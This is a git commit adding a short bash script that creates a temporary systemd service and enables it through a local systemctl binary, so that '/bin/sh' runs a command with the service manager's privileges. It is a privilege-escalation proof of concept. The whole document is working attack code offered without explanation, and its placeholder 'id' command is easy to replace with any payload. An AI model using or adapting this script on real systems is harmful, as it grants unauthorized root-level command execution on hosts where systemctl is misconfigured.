45141ca139858efba7a5e1eb1a38506f4ee3738e
morelulz <38192558+morelulz@users.noreply.github.com>
2020-07-06 22:14:15 -0400

    Create systemctl_rev_sh.sh

---
+++ systemctl_rev_sh.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
